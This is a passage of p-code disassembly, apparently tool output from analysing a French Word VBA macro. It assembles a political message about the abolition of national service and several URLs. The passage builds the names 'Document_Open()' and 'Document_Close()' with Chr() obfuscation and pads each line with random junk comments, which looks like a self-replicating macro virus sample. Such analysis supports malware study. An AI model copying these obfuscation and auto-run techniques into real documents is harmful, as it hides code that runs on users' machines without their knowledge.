' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j5 
' 	QuoteRem 0x010E 0x000C " uotdsswhaur"
' Line #154:
' 	Ld j5 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "on"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "attends"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "lui."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j5 
' 	QuoteRem 0x0064 0x000A " xzdvtqzwv"
' Line #155:
' 	LineCont 0x0004 11 00 00 00
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k7 
' 	BoS 0x0000 
' 	Ld k7 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k7 
' 	QuoteRem 0x0092 0x0009 " eoszzwfv"
' Line #156:
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e8 
' 	BoS 0x0000 
' 	Ld e8 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e8 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0012 "http://sn.agat.net"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b9 
' 	QuoteRem 0x00DA 0x0007 " zbxtyg"
' Line #157:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0022 "http://altern.org/gigm/service.htm"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a7 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x001B "http://www.donquichotte.com"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d6 
' 	QuoteRem 0x0076 0x000B " psdwioytuz"
' Line #158:
' 	LineCont 0x0004 08 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0020 "http://www.multimania.com/antisn"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c5 
' 	QuoteRem 0x000A 0x000D " hhzydsckjjdl"
' Line #159:
' 	LineCont 0x0004 5F 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "Oui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Emploi,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Oui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "armée"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e2 
' 	BoS 0x0000 
' 	Ld e2 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "métier,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Non"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	St e2 
' 	BoS 0x0000 
' 	Ld e2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "national"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sous"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "travail,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e2 
' 	BoS 0x0000 
' 	Ld e2 
' 	LitStr 0x0003 "Non"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "absurdité."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e2 
' 	BoS 0x0000 
' 	LitStr 0x0002 "Un"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "peu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "aide..."
' 	Add 
' 	St g1 
' 	QuoteRem 0x012D 0x000C " dcmfgmfncdc"
' Line #160:
' 	LineCont 0x0004 2B 00 00 00
' 	LitStr 0x0002 "Je"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "avouer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "j"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ai"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "peu"
' 	Add 
' 	St l3 
' 	QuoteRem 0x0019 0x0009 " bgdodebe"
' Line #161:
' 	LineCont 0x0008 37 00 00 00 45 00 00 00
' 	Ld l3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "mal"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "peaufiner"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "document"
' 	Add 
' 	St l3 
' 	BoS 0x0000 
' 	Ld l3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0002 ")."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Merci"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "m"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "aider"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l3 
' 	BoS 0x0000 
' 	Ld l3 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "peu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "améliorer..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l3 
' 	QuoteRem 0x00A9 0x000B " mjgqibxzuh"
' Line #162:
' 	LineCont 0x000C 03 00 00 00 0C 00 00 00 14 00 00 00
' 	LitStr 0x0007 "Version"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "finale"
' 	Add 
' 	St l9 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Voici"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "dernière"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "version"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n2 
' 	BoS 0x0000 
' 	Ld n2 
' 	LitStr 0x0003 "sur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "quoi"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "j"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ai"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "travaillé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ces"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "derniers"
' 	Add 
' 	St n2 
' 	BoS 0x0000 
' 	Ld n2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "temps"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0002 ")."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Tous"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n2 
' 	QuoteRem 0x015D 0x000C " unwybvsirgc"
' Line #163:
' 	LineCont 0x0008 11 00 00 00 48 00 00 00
' 	Ld n2 
' 	LitStr 0x0004 "avis"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "bienvenue"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n2 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Document"
' 	St m1 
' 	BoS 0x0000 
' 	LitStr 0x0002 "Le"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "mystère"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "jour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "résoudre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h8 
' 	BoS 0x0000 
' 	Ld h8 
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "suivant:"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h8 
' 	QuoteRem 0x0074 0x0005 " toay"
' Line #164:
' 	EndSub 
' 	QuoteRem 0x0008 0x000F " vkyfojyynbgbfe"
' Line #165:
' 	LineCont 0x000C 4C 00 00 00 6B 00 00 00 95 00 00 00
' 	FuncDefn (Private Sub f2())
' 	BoS 0x0000 
' 	LitStr 0x0004 "Lors"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "intervention"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "télévisée"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "22"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l5 
' 	BoS 0x0000 
' 	Ld l5 
' 	LitStr 0x0007 "février"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "1996,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Jacques"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Chirac,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "Président"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	St l5 
' 	BoS 0x0000 
' 	Ld l5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "République"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Chef"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Armées,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "proclamé:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l5 
' 	QuoteRem 0x0026 0x0007 " lcadzs"
' Line #166:
' 	LitStr 0x0005 ""Nous"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "n"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "avons"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "besoin"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "appelés..."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "(Le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i1 
' 	BoS 0x0000 
' 	Ld i1 
' 	LitStr 0x0009 "national)"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "devenu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "inégal"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "n"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	St i1 
' 	QuoteRem 0x015F 0x000C " xkinuljkrqo"
' Line #167:
' 	Ld i1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "universel.""
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "National"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "ensuite"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "été"
' 	Add 
' 	St i1 
' 	QuoteRem 0x0099 0x0008 " ulhawoh"
' Line #168:
' 	LineCont 0x001C 17 00 00 00 27 00 00 00 2D 00 00 00 4B 00 00 00 52 00 00 00 96 00 00 00 BB 00 00 00
' 	Ld i1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "supprimé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "tous..."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "presque:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i1 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Alors"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "n"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "obligatoire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "gens"
' 	Add 
' 	St i7 
' 	BoS 0x0000 
' 	Ld i7 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "nés"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "après"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "1979,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "gens"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "nés"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "avant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i7 
' 	BoS 0x0000 
' 	Ld i7 
' 	LitStr 0x0004 "1979"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "peuvent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "encore"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "perdre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "emploi,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "appartement,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i7 
' 	QuoteRem 0x006B 0x000C " qiavnfxaxmd"
' Line #169:
' 	LineCont 0x0010 27 00 00 00 38 00 00 00 40 00 00 00 5E 00 00 00
' 	Ld i7 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "famille"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "simple"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "ordre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
